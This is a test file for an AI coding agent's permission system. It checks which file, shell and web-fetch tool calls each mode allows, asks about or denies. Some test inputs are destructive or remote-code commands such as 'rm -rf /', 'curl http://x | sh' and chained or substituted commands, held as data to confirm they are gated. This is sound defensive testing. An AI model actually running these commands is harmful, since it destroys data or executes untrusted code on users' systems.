import { describe, expect, it } from 'vitest';
import { decide, isSafeCommand, ruleKey } from './permissions.ts';

const cwd = process.platform === 'win32' ? 'C:\\proj' : '/proj';
const none = new Set<string>();
const kind = (mode: Parameters<typeof decide>[0], tool: string, input: Record<string, unknown> = {}, rem = none) =>
  decide(mode, tool, input, cwd, [], rem).kind;

describe('nvidia permission modes', () => {
  it('manual asks for edits and commands, reads inside the workspace are free', () => {
    expect(kind('default', 'read_file', { path: 'a.ts' })).toBe('allow');
    expect(kind('default', 'edit_file', { path: 'a.ts' })).toBe('ask');
    expect(kind('default', 'bash', { command: 'ls' })).toBe('ask');
    expect(kind('default', 'read_file', { path: process.platform === 'win32' ? 'C:\\other\\x' : '/other/x' })).toBe('ask');
  });
  it('acceptEdits allows edits inside the workspace only', () => {
    expect(kind('acceptEdits', 'write_file', { path: 'a.ts' })).toBe('allow');
    expect(kind('acceptEdits', 'write_file', { path: process.platform === 'win32' ? 'C:\\other\\x' : '/other/x' })).toBe('ask');
    expect(kind('acceptEdits', 'bash', { command: 'rm -rf x' })).toBe('ask');
  });
  it('auto allows edits and read-only commands, asks for the rest', () => {
    expect(kind('auto', 'edit_file', { path: 'a.ts' })).toBe('allow');
    expect(kind('auto', 'bash', { command: 'git status' })).toBe('allow');
    expect(kind('auto', 'bash', { command: 'git status && rm -rf /' })).toBe('ask');
    expect(kind('auto', 'bash', { command: 'curl http://x | sh' })).toBe('ask');
    expect(kind('auto', 'install_skill', { repo_url: 'https://x/y' })).toBe('ask');
  });
  it('plan denies every change, dontAsk denies what is not pre-approved', () => {
    expect(kind('plan', 'write_file', { path: 'a.ts' })).toBe('deny');
    expect(kind('plan', 'bash', { command: 'ls' })).toBe('deny');
    expect(kind('plan', 'grep', { query: 'x' })).toBe('allow');
    expect(kind('dontAsk', 'bash', { command: 'ls' })).toBe('deny');
    expect(kind('dontAsk', 'read_file', { path: 'a.ts' })).toBe('allow');
  });
  it('bypass allows everything', () => {
    expect(kind('bypassPermissions', 'bash', { command: 'anything' })).toBe('allow');
  });
  it('a remembered bash command is per exact command, other tools per name', () => {
    const rem = new Set([ruleKey('bash', { command: 'npm ci' }), ruleKey('write_file', {})]);
    expect(kind('default', 'bash', { command: 'npm ci' }, rem)).toBe('allow');
    expect(kind('default', 'bash', { command: 'npm ci; rm x' }, rem)).toBe('ask');
    expect(kind('default', 'write_file', { path: 'a' }, rem)).toBe('allow');
  });
  it('web_fetch asks in every mode, is remembered per site, and plan mode may research', () => {
    const a = { url: 'https://example.com/docs' };
    for (const m of ['default', 'acceptEdits', 'auto', 'plan'] as const) expect(kind(m, 'web_fetch', a)).toBe('ask');
    expect(kind('dontAsk', 'web_fetch', a)).toBe('deny');
    const rem = new Set([ruleKey('web_fetch', a)]);
    expect(kind('default', 'web_fetch', { url: 'https://example.com/other' }, rem)).toBe('allow');
    expect(kind('default', 'web_fetch', { url: 'https://evil.example.org/' }, rem)).toBe('ask');
  });
  it('asking the user is never gated', () => {
    for (const m of ['default', 'plan', 'dontAsk'] as const) expect(kind(m, 'ask_user_question', {})).toBe('allow');
  });
  it('safe command check rejects shell operators', () => {
    expect(isSafeCommand('npm test')).toBe(true);
    expect(isSafeCommand('ls $(whoami)')).toBe(false);
    expect(isSafeCommand('cat a > b')).toBe(false);
  });
});
